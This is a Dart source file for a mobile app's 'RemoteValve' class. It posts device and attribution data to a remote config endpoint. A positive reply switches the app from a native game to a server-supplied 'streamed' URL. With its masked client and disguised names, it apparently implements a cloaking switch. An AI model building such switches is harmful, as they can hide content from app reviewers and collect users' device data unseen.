import 'dart:convert';

import '../contract/shell_verdict.dart';
import '../setup/mission_facade.dart';
import 'agent_mask.dart';
import 'stash_hold.dart';

// ============================================================
// RemoteValve — posts the attribution body, parses the verdict
// ============================================================
// Contract with the manager-owned config endpoint:
//   • Method: POST
//   • Headers: Content-Type / Accept: application/json
//   • Body: merged attribution + device fields (see TrackBeacon)
//   • Timeout: 15 s
// A successful reply with `ok: true` + a URL commits streamed mode.
// Everything else (missing endpoint, HTTP != 200, network error) is
// a "no" answer — the shell routes to the native game.
// ============================================================

class RemoteValve {
  RemoteValve(this._stash);

  final StashHold _stash;

  Future<ShellVerdict> ask(Map<String, dynamic> body) async {
    final String endpoint = MissionFacade.gateUrl;
    if (endpoint.isEmpty) {
      return ShellVerdict.refused('endpoint-missing');
    }

    try {
      final dynamic res = await maskedClient
          .post(
            Uri.parse(endpoint),
            headers: const <String, String>{
              'Content-Type': 'application/json',
              'Accept': 'application/json',
            },
            body: jsonEncode(body),
          )
          .timeout(const Duration(seconds: 15));

      if (res.statusCode != 200) {
        return ShellVerdict.refused('http-${res.statusCode}');
      }

      final Map<String, dynamic> parsed =
          jsonDecode(res.body) as Map<String, dynamic>;
      final ShellVerdict verdict = ShellVerdict.parse(parsed);

      if (verdict.approved && verdict.hasDestination) {
        await _stash.writeStreamUrl(verdict.destination!);
        if (verdict.expiresAtSeconds != null) {
          await _stash.writeStreamTtl(verdict.expiresAtSeconds!);
        }
      }
      return verdict;
    } catch (e) {
      return ShellVerdict.refused(e.toString());
    }
  }

  Future<String?> cached() => _stash.readStreamUrl();
}
